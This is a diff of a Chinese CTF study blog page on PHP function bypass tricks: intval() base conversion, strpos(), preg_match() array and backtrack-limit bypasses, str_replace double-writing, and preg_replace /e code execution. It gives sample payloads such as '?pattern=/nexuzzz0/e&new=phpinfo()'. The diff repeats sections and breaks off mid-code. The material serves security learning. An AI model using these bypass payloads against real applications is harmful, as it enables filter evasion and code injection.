alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png></a></figure></p><h3 id=模式修正符 class=headerLink><a href=#%e6%a8%a1%e5%bc%8f%e4%bf%ae%e6%ad%a3%e7%ac%a6 class=header-mark></a>模式修正符</h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105084.png></a></figure></p><h2 id=intval class=headerLink><a href=#intval class=header-mark></a>intval()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105085.png></a></figure></p><p><strong>intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
 </span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=mi>42</span><span class=p>);</span>                      <span class=c1>// 42
 </span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=mf>4.2</span><span class=p>);</span>                     <span class=c1>// 4
 </span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s1>&#39;42&#39;</span><span class=p>);</span>                    <span class=c1>// 42
@@ -45,10 +45,7 @@
 </span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>    <span class=p>}</span>
 </span></span></code></pre></div><p><code>?num=4476e1</code></p><h3 id=进制转换 class=headerLink><a href=#%e8%bf%9b%e5%88%b6%e8%bd%ac%e6%8d%a2 class=header-mark></a>进制转换</h3><p>:::tips
-0b?? : 二进制
-0??? : 八进制
-0X?? : 十六进制
-:::</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$num</span><span class=o>==</span><span class=mi>4476</span><span class=p>){</span>
+0b?? : 二进制</p><p>0??? : 八进制</p><p>0X?? : 十六进制</p><p>:::</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$num</span><span class=o>==</span><span class=mi>4476</span><span class=p>){</span>
 </span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no no no!&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=p>}</span>
 </span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[a-z]/i&#34;</span><span class=p>,</span> <span class=nv>$num</span><span class=p>)){</span>
@@ -69,14 +66,8 @@
 </span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$num</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span><span class=o>===</span><span class=mi>4476</span><span class=p>){</span>
 </span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span></code></pre></div><p>在上题基础上过滤了开头是<code>0</code>的字符串
-进制转换绕过不可行了，只能通过小数点，使得<code>intval()</code>转变为<code>int()</code>
-<code>?num=4476.0</code></p><h2 id=strpos class=headerLink><a href=#strpos class=header-mark></a>strpos()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621174.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621174.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621174.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621174.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621174.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621174.png 2x" sizes=auto alt=image.png></a></figure>:::tips
-<code>strpos()</code>查找字符串在另一字符串中第一次出现的位置（区分大小写）
-<code>stripos()</code>函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）
-<code>strrpos()</code>查找字符串在另一字符串中最后一次出现的位置（区分大小写）
-<code>strripos()</code>查找字符串在另一字符串中最后一次出现的位置（不区分大小写）
-:::</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span></code></pre></div><p>在上题基础上过滤了开头是<code>0</code>的字符串</p><p>进制转换绕过不可行了，只能通过小数点，使得<code>intval()</code>转变为<code>int()</code></p><p><code>?num=4476.0</code></p><h2 id=strpos class=headerLink><a href=#strpos class=header-mark></a>strpos()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105086.png></a></figure></p><p>:::tips
+<code>strpos()</code>查找字符串在另一字符串中第一次出现的位置（区分大小写）</p><p><code>stripos()</code>函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p><code>strrpos()</code>查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p><code>strripos()</code>查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>:::</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
 </span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;flag.php&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;num&#39;</span><span class=p>])){</span>
@@ -94,77 +85,41 @@
 </span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>    <span class=p>}</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>注意这里的 <code>!strpos()</code>, <code>strops()</code> 返回对应字符第一次出现的位置
-如果我们使用八进制 <code>010574</code>, <code>strpos("010574", "0") </code>返回<code>0</code>, 也就是 <code>false</code>, 加了 <code>!</code> 后反而变成 <code>true</code>
-所以字符串中必须有<code>0</code>, 但<code>0</code>不能在首位 (过滤了八进制), 可以用小数点绕过
-<code>?num=4476.01</code></p><h2 id=preg_match class=headerLink><a href=#preg_match class=header-mark></a>preg_match()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621224.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621224.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621224.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621224.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621224.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621224.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=单行多行匹配 class=headerLink><a href=#%e5%8d%95%e8%a1%8c%e5%a4%9a%e8%a1%8c%e5%8c%b9%e9%85%8d class=header-mark></a>单行/多行匹配</h3><p>几种模式修饰符</p><blockquote><h1 id=模式修饰符httpswwwphpnetmanualzhreferencepcrepatternmodifiersphpreferencepcrepatternmodifiers class=headerLink><a href=#%e6%a8%a1%e5%bc%8f%e4%bf%ae%e9%a5%b0%e7%ac%a6httpswwwphpnetmanualzhreferencepcrepatternmodifiersphpreferencepcrepatternmodifiers class=header-mark></a>模式修饰符<a href=https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers target=_blank rel="noopener noreferrer">¶</a></h1><p>下面列出了当前可用的 PCRE 修饰符。括号中提到的名字是 PCRE 内部这些修饰符的名称。 模式修饰符中的空格，换行符会被忽略，其他字符会导致错误。
-<em>i</em> (PCRE_CASELESS)
-如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。
-<em>m</em> (PCRE_MULTILINE)
-默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， &ldquo;行首"元字符 (^) 仅匹配字符串的开始位置， 而"行末"元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 &ldquo;\n&rdquo; 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。
-<em>s</em> (PCRE_DOTALL)
-如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的/s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。
-<em>x</em> (PCRE_EXTENDED)
-如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 /x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。
-<em>A</em> (PCRE_ANCHORED)
-如果设置了这个修饰符，模式被强制为"锚定"模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来，并且 这也是 perl 种实现这种模式的唯一途径。
-<em>D</em> (PCRE_DOLLAR_ENDONLY)
-如果这个修饰符被设置，模式中的元字符美元符号仅仅匹配目标字符串的末尾。如果这个修饰符 没有设置，当字符串以一个换行符结尾时， 美元符号还会匹配该换行符(但不会匹配之前的任何换行符)。 如果设置了修饰符_m_，这个修饰符被忽略. 在 perl 中没有与此修饰符等同的修饰符。
-<em>S</em>
-当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。
-<em>U</em> (PCRE_UNGREEDY)
-这个修饰符逆转了量词的"贪婪"模式。 使量词默认为非贪婪的，通过量词后紧跟? 的方式可以使其成为贪婪的。这和 perl 是不兼容的。 它同样可以使用 模式内修饰符设置 (?U)进行设置， 或者在量词后以问号标记其非贪婪(比如.<em>?)。
-<strong>注意</strong>:
-在非贪婪模式，通常不能匹配超过 pcre.backtrack_limit 的字符。
-<em>X</em> (PCRE_EXTRA)
-这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。
-<em>J</em> (PCRE_INFO_JCHANGED)
-内部选项设置(?J)修改本地的PCRE_DUPNAMES选项。允许子组重名， (译注：只能通过内部选项设置，外部的 /J 设置会产生错误。) 自 PHP 7.2.0 起，也能支持 J 修饰符。
-<em>u</em> (PCRE_UTF8)
-此修正符打开一个与 Perl 不兼容的附加功能。 模式和目标字符串都被认为是 UTF-8 的。 无效的目标字符串会导致 preg_</em> 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 5 字节和 6 字节的 UTF-8 字符序列以无效字符序列对待。
-<em>n</em> (PCRE_NO_AUTO_CAPTURE)
-使用此修饰符不会捕获简单的 (xyz) 组。只有像 (?xyz) 这样的命名组才会捕获。这仅影响要捕获的组，仍然可以使用编号的子模式引用，并且匹配数组仍将包含编号的结果。</p></blockquote><p>默认单行匹配匹配换行符
-/m 多行匹配不匹配换行符
-一个通过这种方式绕过的实例： <strong>Apache 换行解析漏洞 (CVE-2017-15715)</strong>
-<a href=https://blog.csdn.net/qq_46091464/article/details/108278486 target=_blank rel="noopener noreferrer">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a>
-<a href=https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html target=_blank rel="noopener noreferrer">利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单</a></p><h3 id=数组绕过 class=headerLink><a href=#%e6%95%b0%e7%bb%84%e7%bb%95%e8%bf%87 class=header-mark></a>数组绕过</h3><p><code>preg_match()</code>只能处理字符串，当传入的<code>subject</code>是<strong>数组</strong>时会返回<code>false</code>
-<code>?num[]=1</code></p><h3 id=正则回溯绕过 class=headerLink><a href=#%e6%ad%a3%e5%88%99%e5%9b%9e%e6%ba%af%e7%bb%95%e8%bf%87 class=header-mark></a>正则回溯绕过</h3><p>正则表达式溢出 回溯绕过</p><pre tabindex=0><code>&lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&#34;flag.php&#34;);
-if(isset($_POST[&#39;f&#39;])){
-    $f = (String)$_POST[&#39;f&#39;];
-
-    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f)){
-        die(&#39;bye!&#39;);
-    }
-    if(stripos($f,&#39;36Dctfshow&#39;) === FALSE){
-        die(&#39;bye!!&#39;);
-    }
-
-    echo $flag;
-
-}
-</code></pre><p>回溯失败时会返回 false</p><pre tabindex=0><code>&lt;?php
-$a = str_repeat(&#39;1111&#39;,250000);
-$b = $a.&#39;36Dctfshow&#39;;
-echo $b;
-</code></pre><p>这个漏洞的修复方法是使用 <code>===</code> 与返回值作比较, 例如</p><pre tabindex=0><code>if (preg_match(&#39;xxx&#39;, &#39;yyy&#39;) === 0) {
-	// ...
-}
-</code></pre><p><code>0 === false</code> 返回 <code>false</code>
-<strong>参考：</strong>
-<a href=https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html target=_blank rel="noopener noreferrer">PHP利用PCRE回溯次数限制绕过某些安全限制</a>
-<a href=https://www.laruence.com/2010/06/08/1579.html target=_blank rel="noopener noreferrer">深悉正则(pcre)最大回溯/递归限制</a></p><h2 id=in_array class=headerLink><a href=#in_array class=header-mark></a>in_array()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621254.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621254.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621254.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621254.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621254.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621254.png 2x" sizes=auto alt=image.png></a></figure>检查数组中是否存在某个值，将待搜索的值的类型自动转换为数组中的值的类型</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=n>in_array</span><span class=p>(</span><span class=err>&#39;</span><span class=n>1abc</span><span class=err>&#39;</span><span class=p>,</span><span class=w> </span><span class=o>[</span><span class=n>1</span><span class=p>,</span><span class=n>2</span><span class=p>,</span><span class=n>3</span><span class=p>,</span><span class=n>4</span><span class=p>,</span><span class=n>5</span><span class=o>]</span><span class=p>));</span><span class=w> </span><span class=c1>// true</span><span class=w>
+</span></span></code></pre></div><p>注意这里的 <code>!strpos()</code>, <code>strops()</code> 返回对应字符第一次出现的位置</p><p>如果我们使用八进制 <code>010574</code>, <code>strpos("010574", "0") </code>返回<code>0</code>, 也就是 <code>false</code>, 加了 <code>!</code> 后反而变成 <code>true</code></p><p>所以字符串中必须有<code>0</code>, 但<code>0</code>不能在首位 (过滤了八进制), 可以用小数点绕过</p><p><code>?num=4476.01</code></p><h2 id=str_replace class=headerLink><a href=#str_replace class=header-mark></a>str_replace</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105087.png></a></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;s&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=c1>//替换 select，可以用 seselectlect 绕过
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$sql</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;select&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$sql</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$sql</span><span class=p>;</span>
+</span></span></code></pre></div><p>双写绕过</p><h2 id=preg_replace class=headerLink><a href=#preg_replace class=header-mark></a>preg_replace()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105088.png></a></figure></p><h3 id=修饰符 class=headerLink><a href=#%e4%bf%ae%e9%a5%b0%e7%ac%a6 class=header-mark></a>修饰符</h3><h4 id=e class=headerLink><a href=#e class=header-mark></a>/e</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;pattern&#34;</span><span class=p>],</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;new&#34;</span><span class=p>],</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;base&#34;</span><span class=p>]);</span>
+</span></span></code></pre></div><p>所以可以传入 <code>&lt;font style="color:rgb(76, 73, 72);">/e&lt;/font></code> 的修饰符，然后让代码执行：</p><p><code>&lt;font style="color:rgb(76, 73, 72);">?pattern=/nexuzzz0/e&amp;new=phpinfo()&amp;base=nexuzzz0&lt;/font></code></p><p><a href=https://www.sqlsec.com/2020/07/preg_replace.html#preg-replace target=_blank rel="noopener noreferrer">PHP preg_系列漏洞小结</a></p><h2 id=preg_match class=headerLink><a href=#preg_match class=header-mark></a>preg_match()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105089.png></a></figure></p><h3 id=单行多行匹配 class=headerLink><a href=#%e5%8d%95%e8%a1%8c%e5%a4%9a%e8%a1%8c%e5%8c%b9%e9%85%8d class=header-mark></a>单行/多行匹配</h3><p>几种模式修饰符</p><blockquote><h1 id=模式修饰符httpswwwphpnetmanualzhreferencepcrepatternmodifiersphpreferencepcrepatternmodifiers class=headerLink><a href=#%e6%a8%a1%e5%bc%8f%e4%bf%ae%e9%a5%b0%e7%ac%a6httpswwwphpnetmanualzhreferencepcrepatternmodifiersphpreferencepcrepatternmodifiers class=header-mark></a>模式修饰符<a href=https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers target=_blank rel="noopener noreferrer">¶</a></h1><p>下面列出了当前可用的 PCRE 修饰符。括号中提到的名字是 PCRE 内部这些修饰符的名称。 模式修饰符中的空格，换行符会被忽略，其他字符会导致错误。</p><p><em>i</em> (PCRE_CASELESS)</p><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p><p><em>m</em> (PCRE_MULTILINE)</p><p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， &ldquo;行首"元字符 (^) 仅匹配字符串的开始位置， 而"行末"元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 &ldquo;\n&rdquo; 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</p><p><em>s</em> (PCRE_DOTALL)</p><p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的/s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</p><p><em>x</em> (PCRE_EXTENDED)</p><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 /x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。</p><p><em>A</em> (PCRE_ANCHORED)</p><p>如果设置了这个修饰符，模式被强制为"锚定"模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来，并且 这也是 perl 种实现这种模式的唯一途径。</p><p><em>D</em> (PCRE_DOLLAR_ENDONLY)</p><p>如果这个修饰符被设置，模式中的元字符美元符号仅仅匹配目标字符串的末尾。如果这个修饰符 没有设置，当字符串以一个换行符结尾时， 美元符号还会匹配该换行符(但不会匹配之前的任何换行符)。 如果设置了修饰符_m_，这个修饰符被忽略. 在 perl 中没有与此修饰符等同的修饰符。</p><p><em>S</em></p><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p><p><em>U</em> (PCRE_UNGREEDY)</p><p>这个修饰符逆转了量词的"贪婪"模式。 使量词默认为非贪婪的，通过量词后紧跟? 的方式可以使其成为贪婪的。这和 perl 是不兼容的。 它同样可以使用 模式内修饰符设置 (?U)进行设置， 或者在量词后以问号标记其非贪婪(比如.*?)。</p><p><strong>注意</strong>:</p><p>在非贪婪模式，通常不能匹配超过 pcre.backtrack_limit 的字符。</p><p><em>X</em> (PCRE_EXTRA)</p><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p><p><em>J</em> (PCRE_INFO_JCHANGED)</p><p>内部选项设置(?J)修改本地的PCRE_DUPNAMES选项。允许子组重名， (译注：只能通过内部选项设置，外部的 /J 设置会产生错误。) 自 PHP 7.2.0 起，也能支持 J 修饰符。</p><p><em>u</em> (PCRE_UTF8)</p><p>此修正符打开一个与 Perl 不兼容的附加功能。 模式和目标字符串都被认为是 UTF-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 5 字节和 6 字节的 UTF-8 字符序列以无效字符序列对待。</p><p><em>n</em> (PCRE_NO_AUTO_CAPTURE)</p><p>使用此修饰符不会捕获简单的 (xyz) 组。只有像 (?xyz) 这样的命名组才会捕获。这仅影响要捕获的组，仍然可以使用编号的子模式引用，并且匹配数组仍将包含编号的结果。</p></blockquote><p>默认单行匹配匹配换行符</p><p>/m 多行匹配不匹配换行符</p><p>一个通过这种方式绕过的实例： <strong>Apache 换行解析漏洞 (CVE-2017-15715)</strong></p><p><a href=https://blog.csdn.net/qq_46091464/article/details/108278486 target=_blank rel="noopener noreferrer">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a></p><p><a href=https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html target=_blank rel="noopener noreferrer">利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单</a></p><h3 id=数组绕过 class=headerLink><a href=#%e6%95%b0%e7%bb%84%e7%bb%95%e8%bf%87 class=header-mark></a>数组绕过</h3><p><code>preg_match()</code>只能处理字符串，当传入的<code>subject</code>是<strong>数组</strong>时会返回<code>false</code></p><p><code>?num[]=1</code></p><h3 id=正则回溯绕过 class=headerLink><a href=#%e6%ad%a3%e5%88%99%e5%9b%9e%e6%ba%af%e7%bb%95%e8%bf%87 class=header-mark></a>正则回溯绕过</h3><p>正则表达式溢出 回溯绕过</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>error_reporting(0);
+</span></span><span class=line><span class=cl>highlight_file(__FILE__);
+</span></span><span class=line><span class=cl>include(&#34;flag.php&#34;);
+</span></span><span class=line><span class=cl>if(isset($_POST[&#39;f&#39;])){
+</span></span><span class=line><span class=cl>    $f = (String)$_POST[&#39;f&#39;];
+</span></span><span class=line><span class=cl>
